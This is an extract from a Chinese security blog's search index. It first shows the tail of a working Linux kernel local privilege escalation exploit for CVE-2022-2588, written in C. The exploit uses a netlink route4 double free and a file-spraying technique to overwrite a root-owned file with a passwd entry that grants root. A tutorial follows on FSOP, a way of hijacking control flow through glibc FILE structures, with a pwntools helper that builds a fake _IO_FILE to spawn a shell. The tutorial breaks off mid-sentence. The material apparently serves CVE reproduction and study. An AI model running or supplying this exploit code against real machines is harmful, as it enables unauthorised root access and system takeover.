&lt;&lt; 16, protocol);    t-&gt;tcm_ifindex = 1;    t-&gt;tcm_family = AF_UNSPEC;    t-&gt;tcm_handle = handle;    addattr_l(msg, 0x1000, TCA_KIND, &quot;route&quot;, 6);    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);    addattr_nest_end(msg, tail);    // packing    struct iovec iov = &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;    struct sockaddr_nl nladdr = &#123;.nl_family = AF_NETLINK&#125;;    struct msghdr msgh = &#123;        .msg_name = &amp;nladdr,        .msg_namelen = sizeof(nladdr),        .msg_iov = &amp;iov,        .msg_iovlen = 1,    &#125;;    sendmsg(sockfd, &amp;msgh, 0);    memset(start, 0, 0x4000);    iov.iov_len = 0x4000;    iov.iov_base = start;    recvmsg(sockfd, &amp;msgh, 0);    if (msgh.msg_namelen != sizeof(nladdr))    &#123;        printf(&quot;size of sender address is wrong\\n&quot;);    &#125;    return start;&#125;void delete_tc(int sockfd, uint32_t handle)&#123;    delete_tc_(sockfd, ((handle) &lt;&lt; 8) + (handle));&#125;// basic for sprayint add_tc_basic(int fd, uint32_t handle, void *spray_data, size_t spray_len,                 int spray_count)&#123;    assert(spray_len * spray_count &lt; 0x3000);    char *start = malloc(0x4000);    memset(start, 0, 0x4000);    struct nlmsghdr *msg = (struct nlmsghdr *)start;    // new filter    msg = msg + msg-&gt;nlmsg_len;    msg-&gt;nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // | flags;    msg-&gt;nlmsg_type = RTM_NEWTFILTER;    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));    // prio, protocol    u_int32_t prio = 1;    u_int32_t protocol = 1;    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; 16, protocol);    t-&gt;tcm_ifindex = 1;    t-&gt;tcm_family = AF_UNSPEC;    t-&gt;tcm_handle = handle;    // t-&gt;tcm_parent = TC_H_ROOT;    addattr_l(msg, 0x4000, TCA_KIND, &quot;basic&quot;, 6);    struct rtattr *tail = addattr_nest(msg, 0x4000, TCA_OPTIONS);    struct rtattr *ema_tail = addattr_nest(msg, 0x4000, TCA_BASIC_EMATCHES);    struct tcf_ematch_tree_hdr tree_hdr = &#123;.nmatches = spray_count / 2,                                           .progid = 0&#125;;    addattr_l(msg, 0x4000, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, sizeof(tree_hdr));    struct rtattr *rt_match_tail =        addattr_nest(msg, 0x4000, TCA_EMATCH_TREE_LIST);    char *data = malloc(0x3000);    for (int i = 0; i &lt; tree_hdr.nmatches; i++)    &#123;        char *current;        memset(data, 0, 0x3000);        struct tcf_ematch_hdr *hdr = (struct tcf_ematch_hdr *)data;        hdr-&gt;kind = TCF_EM_META;        hdr-&gt;flags = TCF_EM_REL_AND;        current = data + sizeof(*hdr);        struct tcf_meta_hdr meta_hdr = &#123;            .left.kind = TCF_META_TYPE_VAR &lt;&lt; 12 | TCF_META_ID_DEV,            .right.kind = TCF_META_TYPE_VAR &lt;&lt; 12 | TCF_META_ID_DEV,        &#125;;        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, sizeof(hdr));        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);        addattr_l(msg, 0x4000, i + 1, data, current - data);    &#125;    addattr_nest_end(msg, rt_match_tail);    addattr_nest_end(msg, ema_tail);    addattr_nest_end(msg, tail);    // packing    struct iovec iov = &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;    struct sockaddr_nl nladdr = &#123;.nl_family = AF_NETLINK&#125;;    struct msghdr msgh = &#123;        .msg_name = &amp;nladdr,        .msg_namelen = sizeof(nladdr),        .msg_iov = &amp;iov,        .msg_iovlen = 1,    &#125;;    sendmsg(fd, &amp;msgh, 0);    free(data);    free(start);    return 1;&#125;void *delete_tc_basic(int sockfd, u_int32_t handle)&#123;    char *start = malloc(0x4000);    memset(start, 0, 0x4000);    struct nlmsghdr *msg = (struct nlmsghdr *)start;    // new filter    msg = msg + msg-&gt;nlmsg_len;    msg-&gt;nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;    msg-&gt;nlmsg_type = RTM_DELTFILTER;    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));    // prio, protocol    u_int32_t prio = 1;    u_int32_t protocol = 1;    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; 16, protocol);    t-&gt;tcm_ifindex = 1;    t-&gt;tcm_family = AF_UNSPEC;    t-&gt;tcm_handle = handle;    // t-&gt;tcm_parent = TC_H_ROOT;    addattr_l(msg, 0x1000, TCA_KIND, &quot;basic&quot;, 6);    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);    addattr_nest_end(msg, tail);    // packing    struct iovec iov = &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;    struct sockaddr_nl nladdr = &#123;.nl_family = AF_NETLINK&#125;;    struct msghdr msgh = &#123;        .msg_name = &amp;nladdr,        .msg_namelen = sizeof(nladdr),        .msg_iov = &amp;iov,        .msg_iovlen = 1,    &#125;;    sendmsg(sockfd, &amp;msgh, 0);    memset(start, 0, 0x4000);    iov.iov_len = 0x4000;    iov.iov_base = start;    recvmsg(sockfd, &amp;msgh, 0);    if (msgh.msg_namelen != sizeof(nladdr))    &#123;        printf(&quot;size of sender address is wrong\\n&quot;);    &#125;    return start;&#125;void *slow_write()&#123;    printf(&quot;start slow write\\n&quot;);    clock_t start, end;    int fd = open(&quot;./uaf&quot;, 1);    if (fd &lt; 0)    &#123;        perror(&quot;error open uaf file&quot;);        exit(-1);    &#125;    unsigned long int addr = 0x30000000;    int offset;    for (offset = 0; offset &lt; 0x80000 / 20; offset++)    &#123;        void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);        if (r &lt; 0)        &#123;            printf(&quot;allocate failed at 0x%x\\n&quot;, offset);        &#125;    &#125;    assert(offset &gt; 0);    void *mem = (void *)(addr);    memcpy(mem, &quot;hhhhh&quot;, 5);    struct iovec iov[20];    for (int i = 0; i &lt; 20; i++)    &#123;        iov[i].iov_base = mem;        iov[i].iov_len = offset * 0x1000;    &#125;    run_write = 1;    start = clock();    // 2GB max    if (writev(fd, iov, 20) &lt; 0)    &#123;        perror(&quot;slow write&quot;);    &#125;    end = clock();    double spent = (double)(end - start) / CLOCKS_PER_SEC;    printf(&quot;write done, spent %f s\\n&quot;, spent);    run_write = 0;&#125;void *write_cmd()&#123;    // user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash    char data[1024] =        &quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash&quot;;    // struct iovec iov = &#123;.iov_base = data, .iov_len = strlen(data)&#125;;    struct iovec iov = &#123;.iov_base = content, .iov_len = strlen(content)&#125;;    while (!run_write)    &#123;    &#125;    run_spray = 1;    if (writev(overlap_a, &amp;iov, 1) &lt; 0)    &#123;        printf(&quot;failed to write\\n&quot;);    &#125;    printf(&quot;should be after the slow write\\n&quot;);&#125;void pre_exploit()&#123;    adjust_rlimit();    use_temporary_dir();    setup_namespace();&#125;void exploit()&#123;    char buf[2 * PAGE_SIZE] = &#123;&#125;;    char msg[0x10] = &#123;&#125;;    char *spray;    int cc;    struct rlimit old_lim, lim, new_lim;    // Get old limits    if (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == 0)        printf(&quot;Old limits -&gt; soft limit= %ld \\t&quot;               &quot; hard limit= %ld \\n&quot;,               old_lim.rlim_cur, old_lim.rlim_max);    pin_on_cpu(0);    printf(&quot;starting exploit, num of cores: %d\\n&quot;, cpu_cores);    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);    assert(sockfd != -1);    add_qdisc(sockfd);    // wait for parent    if (read(pipe_child[0], msg, 2) != 2)    &#123;        err(1, &quot;read from parent&quot;);    &#125;    // allocate the vulnerable object    add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);    // ask parent to keep spraying    if (write(pipe_parent[1], &quot;OK&quot;, 2) != 2)    &#123;        err(1, &quot;write to child&quot;);    &#125;    if (read(pipe_child[0], msg, 2) != 2)    &#123;        err(1, &quot;read from parent&quot;);    &#125;    // free the object, to free the slab    add_tc_(sockfd, 0x11, 0x12, 0, NLM_F_CREATE);    // wait for the vulnerable object being freed    usleep(500 * 1000);    printf(&quot;freed the filter object\\n&quot;);    // sync    if (write(pipe_parent[1], &quot;OK&quot;, 2) != 2)    &#123;        err(1, &quot;write to child&quot;);    &#125;    if (read(pipe_child[0], msg, 2) != 2)    &#123;        err(1, &quot;read from parent&quot;);    &#125;    usleep(1000 * 1000);    for (int i = 0; i &lt; spray_num_1; i++)    &#123;        pin_on_cpu(i % cpu_cores);        fds[i] = open(&quot;./data2&quot;, 1);        assert(fds[i] &gt; 0);    &#125;    // double free route4, which will free the file    add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);    usleep(1000 * 100);    // should not sleep too long, otherwise file might be claimed by others    printf(&quot;double free done\\n&quot;);    printf(&quot;spraying files\\n&quot;);    // the following is to figure out which file is freed    for (int i = 0; i &lt; spray_num_2; i++)    &#123;        pin_on_cpu(i % cpu_cores);        fd_2[i] = open(&quot;./uaf&quot;, 1);        assert(fd_2[i] &gt; 0);        for (int j = 0; j &lt; spray_num_1; j++)        &#123;            if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==                0)            &#123;                printf(&quot;found overlap, id : %d, %d\\n&quot;, i, j);                overlap_a = fds[j];                overlap_b = fd_2[i];                pthread_t pid, pid2;                pthread_create(&amp;pid, NULL, slow_write, NULL);                pthread_create(&amp;pid2, NULL, write_cmd, NULL);                while (!run_spray)                &#123;                &#125;                close(overlap_a);                close(overlap_b);                printf(&quot;closed overlap\\n&quot;);                usleep(1000 * 100);                int spray_num = 4096;                write(pipe_file_spray[0][1], &amp;spray_num, sizeof(int));                if (read(pipe_file_spray[1][0], &amp;msg, 2) != 2)                &#123;                    err(1, &quot;read from file spray&quot;);                &#125;                overlapped = true;            &#125;        &#125;        if (overlapped)            break;    &#125;    sleep(3);    while (run_write)    &#123;        sleep(1);    &#125;    if (!overlapped)    &#123;        printf(&quot;no overlap found :(...\\n&quot;);        write(pipe_main[1], &quot;\\xff&quot;, 1);    &#125;    else    &#123;        int xx = open(target, 0);        char buf[0x100] = &#123;&#125;;        // check if user in the passwd        read(xx, buf, 0x30);        if (!strncmp(buf, &quot;user&quot;, 4))        &#123;            write(pipe_main[1], &quot;\\x00&quot;, 1);        &#125;        else        &#123;            printf(&quot;not successful : %s\\n&quot;, buf);            write(pipe_main[1], &quot;\\xff&quot;, 1);        &#125;    &#125;    while (1)    &#123;        sleep(1000);    &#125;&#125;void post_exploit() &#123;&#125;// this poc assume we have a heap address leakedint run_exp()&#123;    if (pipe(pipe_parent) == -1)    &#123;        err(1, &quot;fail to create pipes\\n&quot;);    &#125;    if (pipe(pipe_child) == -1)    &#123;        err(1, &quot;fail to create pipes\\n&quot;);    &#125;    if (pipe(pipe_defrag) == -1)    &#123;        err(1, &quot;fail to create pipes\\n&quot;);    &#125;    if (pipe(pipe_file_spray[0]) == -1)    &#123;        err(1, &quot;fail to create pipes\\n&quot;);    &#125;    if (pipe(pipe_file_spray[1]) == -1)    &#123;        err(1, &quot;fail to create pipes\\n&quot;);    &#125;    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);    if (fork() == 0)    &#123;        // thread for spraying file we want to overwrite        adjust_rlimit();        int spray_num = 0;        if (read(pipe_file_spray[0][0], &amp;spray_num, sizeof(int)) &lt; sizeof(int))        &#123;            err(1, &quot;read file spray&quot;);        &#125;        printf(&quot;got cmd, start spraying %s\\n&quot;, target);        spray_num = 4096;        if (fork() == 0)        &#123;            for (int i = 0; i &lt; spray_num; i++)            &#123;                pin_on_cpu(i % cpu_cores);                open(target, 0);            &#125;            while (1)            &#123;                sleep(10000);            &#125;        &#125;        for (int i = 0; i &lt; spray_num; i++)        &#123;            pin_on_cpu(i % cpu_cores);            open(target, 0);        &#125;        printf(&quot;spray done\\n&quot;);        write(pipe_file_spray[1][1], &quot;OK&quot;, 2);        while (1)        &#123;            sleep(10000);        &#125;        exit(0);    &#125;    if (fork() == 0)    &#123;        pin_on_cpu(0);        pre_exploit();        exploit();        post_exploit();    &#125;    else    &#123;        sleep(2);        if (fork() == 0)        &#123;            // do the defragmentation to exhaust all file slabs            // for cross cache            adjust_rlimit();            for (int i = 0; i &lt; 10000; i++)            &#123;                pin_on_cpu(i % cpu_cores);                open(target, 0);            &#125;            printf(&quot;defrag done\\n&quot;);            if (write(pipe_defrag[1], &quot;OK&quot;, 2) != 2)            &#123;                err(1, &quot;failed write defrag&quot;);            &#125;            while (1)            &#123;                sleep(1000);            &#125;        &#125;        else        &#123;            // memory spray thread            setup_namespace();            pin_on_cpu(0);            int sprayfd = socket(PF_NETLINK, SOCK_RAW, 0);            assert(sprayfd != -1);            add_qdisc(sprayfd);            char msg[0x10] = &#123;&#125;;            char payload[256] = &#123;&#125;;            memset(payload + 0x10, &#x27;A&#x27;, 256 - 0x10);            if (read(pipe_defrag[0], msg, 2) != 2)            &#123;                err(1, &quot;failed read defrag&quot;);            &#125;            // if the exploit keeps failing, please tune the middle and end            int middle = 38;            int end = middle + 40;            // preparing for cross cache            for (int i = 0; i &lt; middle; i++)            &#123;                add_tc_basic(sprayfd, i + 1, payload, 193, 32);            &#125;            add_tc_basic(sprayfd, middle + 1, payload, 193, 32);            add_tc_basic(sprayfd, middle + 2, payload, 193, 32);            add_tc_basic(sprayfd, middle + 3, payload, 193, 32);            if (write(pipe_child[1], &quot;OK&quot;, 2) != 2)            &#123;                err(1, &quot;write to parent\\n&quot;);            &#125;            // allocate route4            if (read(pipe_parent[0], msg, 2) != 2)            &#123;                err(1, &quot;read from parent&quot;);            &#125;            // add_tc_basic(sprayfd, middle+2, payload, 129, 32);            // prepare another part for cross cache            for (int i = middle + 2; i &lt; end; i++)            &#123;                add_tc_basic(sprayfd, i + 1, payload, 193, 32);            &#125;            printf(&quot;spray 256 done\\n&quot;);            for (int i = 1; i &lt; end - 24; i++)            &#123;                // prevent double free of 192                // and being reclaimed by others                if (i == middle || i == middle + 1)                    continue;                delete_tc_basic(sprayfd, i + 1);            &#125;            if (write(pipe_child[1], &quot;OK&quot;, 2) != 2)            &#123;                err(1, &quot;write to parent\\n&quot;);            &#125;            // free route4 here            if (read(pipe_parent[0], msg, 2) != 2)            &#123;                err(1, &quot;read from parent&quot;);            &#125;            // if (cpu_cores == 1) sleep(1);            delete_tc_basic(sprayfd, middle + 2);            delete_tc_basic(sprayfd, middle + 3);            delete_tc_basic(sprayfd, 1);            for (int i = middle + 2; i &lt; end; i++)            &#123;                delete_tc_basic(sprayfd, i + 1);            &#125;            printf(&quot;256 freed done\\n&quot;);            if (write(pipe_child[1], &quot;OK&quot;, 2) != 2)            &#123;                err(1, &quot;write to parent\\n&quot;);            &#125;            while (1)            &#123;                sleep(1000);            &#125;        &#125;    &#125;&#125;int main(int argc, char **argv)&#123;    global = (char *)mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC,                          MAP_SHARED | MAP_ANON, -1, 0);    memset(global, 0, 0x2000);    self_path = global;    snprintf(self_path, 0x100, &quot;%s/%s&quot;, get_current_dir_name(), argv[0]);    printf(&quot;self path %s\\n&quot;, self_path);    int fd = open(target, 0);    content = (char *)(global + 0x100);    strcpy(content, overwrite);    read(fd, content + strlen(overwrite), 0x1000);    close(fd);    assert(pipe(pipe_main) == 0);    printf(&quot;prepare done\\n&quot;);    if (fork() == 0)    &#123;        run_exp();        while (1)        &#123;            sleep(10000);        &#125;    &#125;    char data;    read(pipe_main[0], &amp;data, 1);    if (data == 0)    &#123;        printf(&quot;succeed\\n&quot;);    &#125;    else    &#123;        printf(&quot;failed\\n&quot;);    &#125;&#125;\n\n\n参考链接：\n​    https://github.com/Markakd/CVE-2022-2588\n​    https://paper.seebug.org/2019/\n​    https://elixir.bootlin.com/linux/v5.14/source\n","categories":["Linux Kernel","CVE复现"],"tags":["Rtnetlink","Dirty Cred"]},{"title":"FSOP","url":"/2022/02/23/FSOP/","content":"文章开头给出_IO_FILE结构体的偏移:\n0x0   _flags0x8   _IO_read_ptr0x10  _IO_read_end0x18  _IO_read_base0x20  _IO_write_base0x28  _IO_write_ptr0x30  _IO_write_end0x38  _IO_buf_base0x40  _IO_buf_end0x48  _IO_save_base0x50  _IO_backup_base0x58  _IO_save_end0x60  _markers0x68  _chain0x70  _fileno0x74  _flags20x78  _old_offset0x80  _cur_column0x82  _vtable_offset0x83  _shortbuf0x88  _lock0x90  _offset0x98  _codecvt0xa0  _wide_data0xa8  _freeres_list0xb0  _freeres_buf0xb8  __pad50xc0  _mode0xc4  _unused20xd8  vtable\n\nGlibc2.23下的FSOPFSOP全称是File Stream Oriented Programming进程中打开的所有文件结构体使用一个单链表来进行管理，即通过_IO_list_all进行管理，在fopen的分析中，我们知道了fopen是通过_IO_link_in函数将新打开的结构体链接进入_IO_list_all的，相关的代码如下：\nfp-&gt;file._flags |= _IO_LINKED;...fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;_IO_list_all = fp;\n\n从代码中也可以看出来链表是通过FILE结构体的_chain字段来进行链接的。所以也就形成了链表。\n看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。\n具体来说该如何利用呢？glibc中有一个函数_IO_flush_all_lockp，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在libio\\genops中：\nint_IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  struct _IO_FILE *fp;  int last_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    &#123;    ...      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T     || (_IO_vtable_offset (fp) == 0         &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif     )    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)  result = EOF;        fp = fp-&gt;_chain;    &#125;...&#125;\n\n通过对上面代码的分析我们知道fp-&gt;_IO_write_base处保存这输出缓冲区的数据，并且长度为fp-&gt;_IO_write_ptr-fp-&gt;_IO_write_base，所以上面的if语句实际上就是判断缓冲区是否还有数据，如果有的话就会调用_IO_OVERFLOW去清空缓冲区，其中_IO_OVERFLOW是vtable当中的函数，所以我们若是能够控制_IO_list_all的话就可以控制程序执行流。\n而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：\n\n当 libc 执行 abort 流程时\n\n当执行 exit 函数时\n\n当执行流从 main 函数返回时\n\n\n利用方式伪造_IO_FILE结构体，并且利用漏洞使_IO_list_all指向我们伪造的结构体(当然这里我们可以使用任意结构体_chain字段)，最终触发_IO_flush_all_lockp，绕过检查实现执行流的劫持。\n其中需要绕过的也就是上面的缓冲区，所以只需要\n\nfp-&gt;_mode = 0;\nfp-&gt;_IO_write_ptr = 1;\nfp-&gt;_IO_write_base=0;\n\n最后把vtable修改为我们的system就好。\nGlibc2.24到Glibc2.27下的FSOP在Glibc2.24下，若是直接同上面的构造方式构造就会出现报错，这是因为在这个版本的Glibc下存在一种保护机制。\nvtable check机制分析在执行_IO_OVERLOW时，会先执行到IO_validate_vtable函数，这是因为_IO_OVERLOW的宏定义发生了改变\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n\n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n\n# define _IO_JUMPS_FUNC(THIS) \\  (IO_validate_vtable                                                   \\   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \\                 + (THIS)-&gt;_vtable_offset)))\n\n可以看到是在最后调用vtable的函数之前调用了IO_validate_vtable函数。\nstatic inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123;  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  const char *ptr = (const char *) vtable;  uintptr_t offset = ptr - __start___libc_IO_vtables;  if (__glibc_unlikely (offset &gt;= section_length))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;&#125;\n\n在上述代码当中，__start___libc_IO_vtables指向了第一个vtable的地址_IO_helper_jumps，__stop___libc_IO_vtables指向了最后一个vtable函数_IO_str_chk_jumps的结束地址。上面检验的就是当前的vtable是否在这两个地址之间。因此，简单的覆盖vtable是无法通过检查的。\n利用方式其实在上述的check机制分析当中还存在一个检查外部vtable是否合法，不过存在的问题是我们无法控制flag，因为其是随机产生的。所以，我们使用的利用方式还是内部的vtable，使用到了vtable是_IO_str_jumps。\n首先观察其源码当中定义的函数表：\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_str_finish),  JUMP_INIT(overflow, _IO_str_overflow),  JUMP_INIT(underflow, _IO_str_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_str_pbackfail),  JUMP_INIT(xsputn, _IO_default_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_str_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_default_setbuf),  JUMP_INIT(sync, _IO_default_sync),  JUMP_INIT(doallocate, _IO_default_doallocate),  JUMP_INIT(read, _IO_default_read),  JUMP_INIT(write, _IO_default_write),  JUMP_INIT(seek, _IO_default_seek),  JUMP_INIT(close, _IO_default_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)&#125;;\n\n上面是我在Glibc源码当中看到的，下面是我调试出来的：\n\n不过可以看到的是源码中的JUMP_INIT_DUMMY占了16字节。所以_IO_str_finish的偏移量为0x10，而_IO_str_overflow的偏移量为0x18。\n再来看_IO_str_finish的源码：\nvoid_IO_str_finish (_IO_FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);   fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;\n\n可以看到直接使用了fp-&gt;_s._free_buffer当作函数地址，参数即为_IO_buf_base。到了这一步，利用方式就很明显了。\n下面构造结构体，同样的，我们仍需要绕过之前_IO_flush_all_lokcp函数中的检测，也就是_mode&lt;=0以及_IO_write_ptr&gt;_IO_write_base。然后重点就是vtable的地址我们不能直接的_IO_str_jumps，我们应当写入_IO_str_jumps-8，这里解释一下，因为我们在绕过_IO_flush_all_lokcp的检查后会调用到_IO_OVERFLOW函数，但是我们真正要进入的其实是_IO_str_finish函数，又因为他相对与vtable的偏移量刚好比_IO_OVERFLOW小8个字节，所以减去8即可执行到_IO_str_finish。\n接着问题就是(((_IO_strfile *) fp)-&gt;_s._free_buffer)函数相对于fp的偏移量是多少，调试结果出来发现偏移量是0xe8，最后在fp-&gt;_IO_buf_base的地方写上/bin/sh的地址即可getshell。\n这里给出打包的函数：\ndef pack_file(_IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _mode=0, vtable=0):    IO_FILE = p64(0)*3+p64(_IO_read_base) + \\        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(0)+p64(_IO_buf_base)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEfile_struct = pack_file(IO_list_all, 0, 1, bin_sh_addr, 0, IO_str_jumps-8)file_struct += p64(0)+p64(system_addr)\n\n这是我上一篇复现的exp当中的函数，我是根据其他师傅的exp写的，但是这里的_IO_read_base我也没在源码中看到有什么检验，我估计不用加上也行。\nGlibc2.29下的FSOP这应该是最后一个可以用FSOP的版本了，在Glibc2.31也会有这方面的使用，不过都不能直接getshell了。\n首先注意的是，我们在上面使用的是_IO_str_finish函数来利用的，但是这里的函数源码发生了改变：\nvoid_IO_str_finish (FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    free (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;\n\n可以看到这里直接替换成了free，所以我们这里是没有利用空间的了。\n其他师傅的查找发现在_IO_wfile_jumps这个vtable里依旧存在大量的函数指针，而且当中最好利用的则是_IO_wfile_sync函数，一样的先看一下源码：\nwint_t_IO_wfile_sync (FILE *fp)&#123;  ssize_t delta;  wint_t retval = 0;  /*    char* ptr = cur_ptr(); */  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)    if (_IO_do_flush (fp))      return WEOF;  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;  if (delta != 0)    &#123;      /* We have to find out how many bytes we have to go back in the\t external buffer.  */      struct _IO_codecvt *cv = fp-&gt;_codecvt;      off64_t new_pos;      int clen = (*cv-&gt;__codecvt_do_encoding) (cv);      if (clen &gt; 0)\t/* It is easy, a fixed number of input bytes are used for each\t   wide character.  */\tdelta *= clen;      else\t&#123;\t  /* We have to find out the hard way how much to back off.\t     To do this we determine how much input we needed to\t     generate the wide characters up to the current reading\t     position.  */\t  int nread;\t  fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;\t  nread = (*cv-&gt;__codecvt_do_length) (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,\t\t\t\t\t      fp-&gt;_IO_read_base,\t\t\t\t\t      fp-&gt;_IO_read_end, delta);\t  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base + nread;\t  delta = -(fp-&gt;_IO_read_end - fp-&gt;_IO_read_base - nread);\t&#125;      new_pos = _IO_SYSSEEK (fp, delta, 1);      if (new_pos != (off64_t) EOF)\t&#123;\t  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;\t  fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;\t&#125;      else if (errno == ESPIPE)\t; /* Ignore error from unseekable devices. */      else\tretval = WEOF;    &#125;  if (retval != WEOF)    fp-&gt;_offset = _IO_pos_BAD;  /* FIXME: Cleanup - can this be shared? */  /*    setg(base(), ptr, ptr); */  return retval;&#125;\n\n可以注意到的是这两行代码：\nstruct _IO_codecvt *cv = fp-&gt;_codecvt;int clen = (*cv-&gt;__codecvt_do_encoding) (cv);\n\n这里又是将fp-&gt;_codecvt-&gt;__codecvt_do_encoding来做为函数来执行，参数则是fp-&gt;_codecvt\n再看_IO_codecvt结构体在源码是什么样子：\nstruct _IO_codecvt&#123;  void (*__codecvt_destr) (struct _IO_codecvt *);  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,\t\t\t\t\t     __mbstate_t *,\t\t\t\t\t     const wchar_t *,\t\t\t\t\t     const wchar_t *,\t\t\t\t\t     const wchar_t **, char *,\t\t\t\t\t     char *, char **);  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,\t\t\t\t\t\t __mbstate_t *, char *,\t\t\t\t\t\t char *, char **);  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,\t\t\t\t\t    __mbstate_t *,\t\t\t\t\t    const char *, const char *,\t\t\t\t\t    const char **, wchar_t *,\t\t\t\t\t    wchar_t *, wchar_t **);  int (*__codecvt_do_encoding) (struct _IO_codecvt *);  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,\t\t\t      const char *, const char *, size_t);  int (*__codecvt_do_max_length) (struct _IO_codecvt *);  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;\n\n可以看到这里的__codecvt_do_encoding偏移量为4，所以要进行利用只需要满足以下条件：\n1.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base2.fp-&gt;_wide_data-&gt;_IO_read_ptr - 